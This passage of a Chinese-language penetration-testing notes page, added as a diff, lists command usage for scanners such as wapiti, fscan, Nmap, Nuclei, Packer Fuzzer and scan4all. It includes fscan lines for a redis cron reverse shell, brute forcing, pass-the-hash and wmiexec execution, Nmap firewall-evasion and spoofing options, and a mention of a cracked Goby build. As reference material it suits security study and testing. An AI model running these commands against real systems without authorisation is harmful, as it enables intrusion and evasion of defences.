+<h4 id="7-3-WordPress网站扫描"><a href="#7-3-WordPress网站扫描" class="headerlink" title="7.3 WordPress网站扫描"></a>7.3 WordPress网站扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># WordPress专用扫描</span><br><span class="line">wapiti -u http://target.com -m &quot;wp&quot; -o wp_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-4-API接口扫描"><a href="#7-4-API接口扫描" class="headerlink" title="7.4 API接口扫描"></a>7.4 API接口扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 针对REST API的扫描</span><br><span class="line">wapiti -u http://target.com/api -m &quot;sql,xss,exec&quot; --scope folder -o api_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="八、实战示例"><a href="#八、实战示例" class="headerlink" title="八、实战示例"></a>八、实战示例</h3><h4 id="示例1：扫描测试网站DVWA"><a href="#示例1：扫描测试网站DVWA" class="headerlink" title="示例1：扫描测试网站DVWA"></a>示例1：扫描测试网站DVWA</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 扫描DVWA（需先启动DVWA服务）</span><br><span class="line">wapiti -u http://localhost/dvwa -o dvwa_scan</span><br><span class="line"></span><br><span class="line"># 使用认证扫描DVWA</span><br><span class="line">wapiti -u http://localhost/dvwa \</span><br><span class="line">  -a &#x27;&#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;password&quot;, &quot;url&quot;: &quot;http://localhost/dvwa/login.php&quot;&#125;&#x27; \</span><br><span class="line">  -o dvwa_auth_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="示例2：扫描包含登录的Web应用"><a href="#示例2：扫描包含登录的Web应用" class="headerlink" title="示例2：扫描包含登录的Web应用"></a>示例2：扫描包含登录的Web应用</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 步骤1：首先正常扫描</span><br><span class="line">wapiti -u http://target.com -o initial_scan</span><br><span class="line"></span><br><span class="line"># 步骤2：如果发现登录页面，使用认证扫描</span><br><span class="line">wapiti -u http://target.com \</span><br><span class="line">  --cookie &quot;sessionid=abc123def456&quot; \</span><br><span class="line">  -o authenticated_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="示例3：限制扫描范围（避免误操作）"><a href="#示例3：限制扫描范围（避免误操作）" class="headerlink" title="示例3：限制扫描范围（避免误操作）"></a>示例3：限制扫描范围（避免误操作）</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描指定目录</span><br><span class="line">wapiti -u http://target.com/admin --scope folder -o admin_scan</span><br><span class="line"></span><br><span class="line"># 排除某些路径</span><br><span class="line">wapiti -u http://target.com --exclude &quot;logout,delete&quot; -o safe_scan</span><br></pre></td></tr></table></figure>
+
+<h2 id="DudeSuite"><a href="#DudeSuite" class="headerlink" title="DudeSuite"></a>DudeSuite</h2><p>一款渗透测试工具集</p>
+<p>集成请求重放、漏洞验证、端口扫描、密码爆破、shell管理、fofa、编解码等实用工具</p>
+<p><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2FYLKhV1zm0uiczV2K03vH%2Fimage.png?alt=media&#x26;token=f8449b07-df7f-4331-bf10-e717674701b1" alt="img"></p>
+<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
+<p>简单用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></table></figure>
+
+<p>其他用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>红队破解版，有很多公开的红队POC可以自行集成</p>
+<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2F1bUaoUgpw5a1AB77HitB%2Fimage.png?alt=media&#x26;token=53e026fb-a512-4033-9cb6-4a36e0f2d9cd" alt=""><figcaption></figcaption></figure>
+
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>1. nmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢</p>
+<p>2. nmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快</p>
+<p>3. nmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描</p>
+<p>4. nmap -sU 192.168.96.4  &#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a>扫描,慢,可得到有价值的服务器程序</p>
+<p>5. nmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包</p>
+<p>6. nmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽</p>
+<p>7. nmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描</p>
+<p>8. nmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描</p>
+<p>9. nmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml</p>
+<p>10. nmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。</p>
+<p>11. nmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描</p>
+<p>12. nmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描</p>
+<p>13. nmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长</p>
+<p>14. nmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长</p>
+<p>15. nmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描</p>
+<p>16. nmap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出</p>
+<p>17. nmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数</p>
+<p>18. nmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测</p>
+<p>19. nmap –source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口</p>
+<p>20. nmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</p>
+<p>21. nmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)</p>
+<p>22. nmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）</p>
+<p>23. nmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。</p>
+<p>24. nmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要</p>
+<p>25. nmap –system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器</p>
+<p>26. nmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。</p>
+<p>27. nmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p>
+<p>28. nmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。</p>
+<p>29. nmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。</p>
+<h3 id="防火墙-x2F-IDS逃逸-amp-x20"><a href="#防火墙-x2F-IDS逃逸-amp-x20" class="headerlink" title="防火墙&#x2F;IDS逃逸&amp;#x20;"></a>防火墙&#x2F;IDS逃逸&amp;#x20;</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -f --mtu=16 192.168.0.8</span><br><span class="line">#报文分段，mtu必须是8的倍数</span><br><span class="line"></span><br><span class="line">nmap -sI www.0day.com:80 192.168.0.8	</span><br><span class="line">#源IP欺骗</span><br><span class="line"></span><br><span class="line">nmap --source-port 53 192.168.0.8		</span><br><span class="line">#源端口欺骗</span><br><span class="line">#防火墙对服务器的设置会根据端口选择是否信任数据流</span><br><span class="line">#管理员可能会认为这些端口不会有攻击发生，所以可以利用这些端口扫描</span><br><span class="line"></span><br><span class="line">nmap --data-length 30 192.168.0.8</span><br><span class="line">#在原来报文基础上，附加随机数据，达到规避防火墙的效果</span><br><span class="line"></span><br><span class="line">nmap --spoof-mac 0 192.168.0.8</span><br><span class="line">#指定一个随机的MAC地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="返回说明"><a href="#返回说明" class="headerlink" title="返回说明"></a>返回说明</h3><h4 id="端口状态说明"><a href="#端口状态说明" class="headerlink" title="端口状态说明"></a>端口状态说明</h4><p><strong>open(开放的)</strong></p>
+<p>应用程序正在该端口接收TCP 连接或者UDP报文。</p>
+<p><strong>closed(关闭的)</strong></p>
+<p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。</p>
+<p><strong>filtered(被过滤的)</strong></p>
+<p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。</p>
+<p>过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。</p>
+<p><strong>unfiltered(未被过滤的)</strong></p>
+<p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。</p>
+<p>只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。</p>
+<p>用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p>
+<p><strong>open|filtered(开放或者被过滤的)</strong></p>
+<p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。</p>
+<p>开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。</p>
+<p>因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p>
+<p><strong>closed|filtered(关闭或者被过滤的)</strong></p>
+<p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p>
+<h4 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h4><p><strong>TCP连接扫描</strong></p>
+<p>使用操作系统的网络连接系统调用 connect()，对目标主机发起 TCP 三路握手，待完成后 Nmap 立即中断此次连接。</p>
+<p>Nmap 通过获取每个尝试连接的状态信息来判定侦测端口的状态</p>
+<p><strong>SYN扫描</strong></p>
+<p>Nmap 产生一个 SYN 数据报文，如果侦测端口开放并返回 SYN-ACK 响应报文</p>
+<p>Nmap 据此发送 RST 报文给侦测端口结束当前连接，这样做的好处在于缩短了端口扫描时间</p>
+<p><strong>UDP扫描</strong></p>
+<p>UDP 本身是无连接的协议，Nmap 向目标主机的端口发送 UDP 探测报文</p>
+<p>如果端口没有开放，被侦测主机将会发送一个 ICMP 端口不可到达的消息</p>
+<p>Nmap 根据这个消息确定端口闭合（closed）或者被过滤 (unfiltered)</p>
+<p>通常没有回复意味着端口是开放（open）状态 。</p>
+<p><strong>ACK扫描</strong></p>
+<p>这种扫描比较特殊，它不能确切知道端口的基本状态，而是主要用来探测防火墙是否存在以及其中设定的过滤规则</p>
+<p><strong>FIN扫描</strong></p>
+<p>和 SYN 扫描相比，这种方式更为隐蔽，因此能够穿过防火墙的过滤</p>
+<p>关闭（closed）端口将会返回合适的 RST 报文，而开放端口将忽略这样的侦测报文</p>
+<p>具备类似防火墙不敏感特性的还有 -sN NULL 扫描，-sX X-mas 扫描。</p>
+<h2 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h2><p>Nuclei是一个基于模板的、可配置攻击目标的扫描快速工具，同时还提供了强大的可扩展性和易用性。</p>
+<h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>-c 并发请求数（默认10）nuclei -c 100</p>
+<p>-timeout 超时时间(默认为5秒) nuclei -timeout 5&amp;#x20;</p>
+<p>-proxy-url 输入代理地址 nuclei -proxy-url hxxp:&#x2F;&#x2F;127.0.0.1:8080&amp;#x20;</p>
+<p>-proxy-socks-url 输入socks代理地址 nuclei -proxy-socks-url socks5:&#x2F;&#x2F;user:pass@Your IP:1080&amp;#x20;</p>
+<p>-random-agent 使用随机的UA nuclei -random-agent&amp;#x20;</p>
+<p>-H 自定义请求头 nuclei -H “x-bug-bounty:hacker”&amp;#x20;</p>
+<p>-update-templates 下载或者升级模板  nuclei -update-templates&amp;#x20;</p>
+<p>nuclei -t test.yaml –validate 验证模板格式</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a>  指定模板和目标</p>
+<p>nuclei -t test.yaml -l target.txt  批量扫描</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -p socks5:&#x2F;&#x2F;127.0.0.1:7890 指定代理</p>
+<p>nuclei -t test.yaml -l target.txt -stats Debug  查看扫描进度</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -debug查看发送数据包和返回包</p>
+<h3 id="全部参数"><a href="#全部参数" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nuclei -h</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">  nuclei [命令]</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">目标：</span><br><span class="line">   -u, -target string[]                 指定扫描的URL/主机</span><br><span class="line">   -l, -list string                     指定需要扫描的URL/主机文件（一行一个）</span><br><span class="line"></span><br><span class="line">模板：</span><br><span class="line">   -t, -templates string[]              指定需要扫描的模板或者模板的路径</span><br><span class="line">   -nt, -new-templates                  只扫描最新版本中添加的模板</span><br><span class="line">   -w, -workflows string[]              指定扫描中的工作流或者工作流目录</span><br><span class="line">   -validate                            验证通过的模板</span><br><span class="line">   -tl                                  列出所有可用的模板</span><br><span class="line"></span><br><span class="line">过滤：</span><br><span class="line">   -tags string[]                       执行有标记的模板子集</span><br><span class="line">   -etags, -exclude-tags string[]       执行标记为排除的模板</span><br><span class="line">   -itags, -include-tags string[]       不执行具有攻击性的模板</span><br><span class="line">   -et, -exclude-templates string[]     要排除的模板或者模板目录</span><br><span class="line">   -it, -include-templates string[]     执行默认或配置中排除的模板</span><br><span class="line">   -s, -severity value[]                根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -es, -exclude-severity value[]       根据严重程度排除模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -a, -author string[]                 执行指定作者的模板</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">   -o, -output string                   输出发现的问题到文件</span><br><span class="line">   -silent                              只显示结果</span><br><span class="line">   -nc, -no-color                       禁用输出内容着色（ANSI转义码）</span><br><span class="line">   -json                                输出为jsonL（ines）</span><br><span class="line">   -irr, -include-rr                    在JSONL中输出对应的请求和相应（仅结果）</span><br><span class="line">   -nm, -no-meta                        不显示匹配的元数据</span><br><span class="line">   -nts, -no-timestamp                  不在输出中显示时间戳</span><br><span class="line">   -rdb, -report-db string              本地的Nuclei结果数据库（始终使用该数据库保存结果）       </span><br><span class="line">   -me, -markdown-export string         以markdown导出结果</span><br><span class="line">   -se, -sarif-export string            以SARIF导出结果</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">   -config string                       指定Nuclei的配置文件</span><br><span class="line">   -rc, -report-config string           指定Nuclei报告模板文件</span><br><span class="line">   -H, -header string[]                 指定报告中的标题：value格式</span><br><span class="line">   -V, -var value                       通过var=value指定var值</span><br><span class="line">   -r, -resolvers string                指定Nuclei的解析文件</span><br><span class="line">   -sr, -system-resolvers               当DNS错误时使用系统DNS</span><br><span class="line">   -passive                             启用被动扫描处理HTTP响应</span><br><span class="line">   -ev, env-vars                        在模板中使用环境变量</span><br><span class="line"></span><br><span class="line">交互：</span><br><span class="line">   -inserver, -ineractsh-server string  使用interactsh反连检测平台（默认为&quot;https://interact.sh&quot;）</span><br><span class="line">   -itoken, -interactsh-token string    指定反连检测平台的身份凭证</span><br><span class="line">   -interactions-cache-size int         指定保存在交互缓存中的请求数（默认：5000）</span><br><span class="line">   -interactions-eviction int           从缓存中删除请求前等待的时间（默认为60秒）</span><br><span class="line">   -interactions-poll-duration int      每个轮询前等待时间（默认为5秒）</span><br><span class="line">   -interactions-cooldown-period int    退出轮询前的等待时间（默认为5秒）</span><br><span class="line">   -ni, -no-interactsh                  禁用反连检测平台，同时排除基于反连检测的模板</span><br><span class="line"></span><br><span class="line">限速：</span><br><span class="line">   -r1, -rate-limit int                 每秒最大请求量（默认：150）</span><br><span class="line">   -rlm, -rate-limit-minute int         每分钟最大请求量</span><br><span class="line">   -bs, -bulk-size int                  每个模板最大并行检测数（默认：25）</span><br><span class="line">   -c, -concurrency int                 并行执行的最大模板数量（默认：25）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化：</span><br><span class="line">   -timeout int                         超时时间（默认为5秒）</span><br><span class="line">   -retries int                         重试次数（默认：1）</span><br><span class="line">   -mhe, -max-host-error int            某主机扫描失败次数，跳过该主机（默认：30）</span><br><span class="line">   -project                             使用项目文件夹避免多次发送同一请求</span><br><span class="line">   -project-path string                 设置特定的项目文件夹</span><br><span class="line">   -spm, -stop-at-first-path            得到一个结果后停止（或许会中断模板和工作流的逻辑）</span><br><span class="line">   -stream                              流模式 - 在不整理输入的情况下详细描述</span><br><span class="line"></span><br><span class="line">无界面浏览器：</span><br><span class="line">    -headless                           启用需要无界面浏览器的模板</span><br><span class="line">    -page-timeout int                   在无界面下超时秒数（默认：20）</span><br><span class="line">    -sb, -show-brower                   在无界面浏览器运行模板时，显示浏览器</span><br><span class="line">    -sc, -system-chrome                 不使用Nuclei自带的浏览器，使用本地浏览器</span><br><span class="line"></span><br><span class="line">调试：</span><br><span class="line">    -debug                              显示所有请求和响应</span><br><span class="line">    -debug-req                          显示所有请求</span><br><span class="line">    -debug-resp                         显示所有响应</span><br><span class="line">    -proxy, -proxy-url string           使用HTTP代理</span><br><span class="line">    -proxy-socks-url string             使用SOCK5代理</span><br><span class="line">    -tlog, -trace-log string            写入请求日志到文件</span><br><span class="line">    -version                            显示版本信息</span><br><span class="line">    -v, -verbose                        显示详细信息</span><br><span class="line">    -vv                                 显示额外的详细信息</span><br><span class="line">    -tv, -templates-version             显示已安装的模板版本</span><br><span class="line"></span><br><span class="line">升级：</span><br><span class="line">    -update                             更新Nuclei到最新版本</span><br><span class="line">    -ut, -update-templates              更新Nuclei模板到最新版</span><br><span class="line">    -ud, -update-directory string       覆盖安装模板</span><br><span class="line">    -duc, -disable-update-check         禁用更新</span><br><span class="line"></span><br><span class="line">统计：</span><br><span class="line">    -stats                              显示正在扫描的统计信息</span><br><span class="line">    -sj, -stats-json                    将统计信息以JSONL格式输出到文件</span><br><span class="line">    -si, -stats-inerval int             显示统计信息更新的间隔秒数（默认：5）</span><br><span class="line">    -m, -metrics                        显示Nuclei端口信息</span><br><span class="line">    -mp, -metrics-port int              更改Nuclei默认端口（默认：9092）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer Fuzzer"></a>Packer Fuzzer</h2><p>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</p>
+<h3 id="全部参数-1"><a href="#全部参数-1" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u（--url）</span><br><span class="line"></span><br><span class="line">要扫描的网站网址路径，为必填选项，例如：-u https://demo.poc-sir.com；</span><br><span class="line"></span><br><span class="line">-c（--cookie）</span><br><span class="line"></span><br><span class="line">附加cookies内容，可为空，若填写则将全局传入，例如：-c &quot;POC=666;SIR=233&quot;；</span><br><span class="line"></span><br><span class="line">-d（--head)</span><br><span class="line"></span><br><span class="line">附加HTTP头部内容，可为空，若填写则将全局传入，默认为Cache-Control:no-cache，例如：-d &quot;Token:3VHJ32HF0&quot;；</span><br><span class="line"></span><br><span class="line">-l（--lang）</span><br><span class="line"></span><br><span class="line">语言选项，当为空时自动选择系统对应语言选项，若无对应语言包则自动切换至英文界面。可供选择的语言包有：简体中文(zh)、法语(fr)、西班牙语(es)、英语(en)、日语(ja)，例如：-l zh；</span><br><span class="line"></span><br><span class="line">-t（--type）</span><br><span class="line"></span><br><span class="line">分为基础版和高级版，当为空时默认使用基础版。高级版将会对所有API进行重新扫描并模糊提取API对应的参数，并进行：SQL注入漏洞、水平越权漏洞、弱口令漏洞、任意文件上传漏洞的检测。可使用adv选项进入高级版，例如：-t adv；</span><br><span class="line"></span><br><span class="line">-p（--proxy）</span><br><span class="line"></span><br><span class="line">全局代理，可为空，若填写则全局使用代理IP，例如：-p https://hack.cool:8080；</span><br><span class="line"></span><br><span class="line">-j（--js）</span><br><span class="line"></span><br><span class="line">附加JS文件，可为空，当您认为还有其他JS文件需要本工具分析时，可使用此选项，例如：-j https://demo.poc-sir.com/js/index.js,https://demo.poc-sir.com/js/vue.js；</span><br><span class="line"></span><br><span class="line">-b（--base）</span><br><span class="line"></span><br><span class="line">指定API中间部分（例如某API为：https://demo.poc-sir.com/v1_api/login 时，则其basedir为：v1_api），可为空，当您认为本工具自动提取的basedir不准确时，可使用此选项，例如：-b v1_api；</span><br><span class="line"></span><br><span class="line">-r（--report）</span><br><span class="line"></span><br><span class="line">指定生成的报告格式，当为空时默认生成HTML和DOC格式的报告。可供选择的报告格式有：html、doc、pdf、txt，例如：-r html,pdf；</span><br><span class="line"></span><br><span class="line">-e（--ext）</span><br><span class="line"></span><br><span class="line">是否开启扩展插件选项，本工具支持用户自我编写插件并存入ext目录（如何编写请参考对应目录下demo.py文件）。默认为关闭状态，当用户使用on命令开启时，本工具将会自动执行对应目录下的插件，例如：-e on；</span><br><span class="line"></span><br><span class="line">-f（--flag）</span><br><span class="line"></span><br><span class="line">SSL连接安全选项，当为空时默认关闭状态，在此状态下将会阻止一切不安全的连接。若您希望忽略SSL安全状态，您可使用1命令开启，将会忽略一切证书错误，例如：-f 1；</span><br><span class="line"></span><br><span class="line">-s（--silent）</span><br><span class="line"></span><br><span class="line">静默选项，一旦开启则一切询问YES或NO的操作都将自动设置为YES，并且参数后的内容便是本次扫描报告的名称（自定义报告名），可用于无人值守、批量操作、插件调用等模式，例如：-s Scan_Task_777。</span><br><span class="line"></span><br><span class="line">--st（--sendtype）</span><br><span class="line"></span><br><span class="line">请求方式选项，目前本选项支持POST和GET参数，一旦开启则将会使用对应的请求方式扫描所有的API，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ct（--contenttype）</span><br><span class="line"></span><br><span class="line">Content-Type选项，可通过此选项自定义扫描时的HTTP请求头中的Content-Type参数内容，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--pd（--postdata）</span><br><span class="line"></span><br><span class="line">POST内容选项，可通过此选项自定义扫描时的POST请求内容(所有的扫描都将会使用此内容，仅对POST场景有效)，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ah（--apihost）</span><br><span class="line"></span><br><span class="line">Api域名选项，可通过此选项自定义扫描时所有的API请求域名，例如：api部分(从JS中提取到的API路径)为/v1/info，扫描的url(-u --url参数传入内容，扫描的网页)为http://exp.com/，当apihost参数传入https://pocsir.com:777/则此时的API为https://pocsir.com:777/v1/info而不是http://exp.com/v1/info，用于api与前端不同域名或服务器等场景。</span><br><span class="line"></span><br><span class="line">--fe（--fileext）</span><br><span class="line"></span><br><span class="line">Api扩展名选项，可通过此选项对所有API都添加特定的扩展名，以便应对在提取API时出现扩展名提取缺失的情况，例如：当提取到的API为https://pocsir.com:777/v1/info时，传入--fe .json则工具将会自动将API转化成https://pocsir.com:777/v1/info.json进行扫描及检测。</span><br></pre></td></tr></table></figure>
+
+<h2 id="scan4all"><a href="#scan4all" class="headerlink" title="scan4all"></a>scan4all</h2><p>集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写</p>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>对 127.0.0.1 进行http常用端口扫描，扫描完端口后对端口地址进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>直接对端口地址测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>
+
+<p>对 192.168.1.1&#x2F;24 C段进行端口扫描，扫描完端口后对端口地址进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+
+<p>对 ips.txt 内的 ip&#x2F;域名&#x2F;c段&#x2F;url地址 进行逐行检测(如果有url地址，则不会进行端口扫描)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -l ips.txt</span><br></pre></td></tr></table></figure>
+
+<p>对 127.0.0.1 的7001,7002端口进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -p 7001,7002</span><br></pre></td></tr></table></figure>
+
+<p>对 127.0.0.1 进行 NmapTop1000 端口进行检测 (不使用此参数，默认进行http常用端口扫描)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -top-Ports 1000</span><br><span class="line">scan4all -host 127.0.0.1 -top-Ports http</span><br></pre></td></tr></table></figure>
+
+<p>使用dnslog</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -ceyeapi xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -ceyedomain xxxxxx.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>导出到文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -json -o 1.json</span><br><span class="line">scan4all -host 127.0.0.1 -csv -o 1.csv</span><br></pre></td></tr></table></figure>
+
+<p>只扫描端口和指纹不检测poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -np</span><br></pre></td></tr></table></figure>
+
+<p>设置扫描线程和速率&amp;#x20;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -c 25 -rate 1000</span><br></pre></td></tr></table></figure>
+
+<p>设置代理</p>
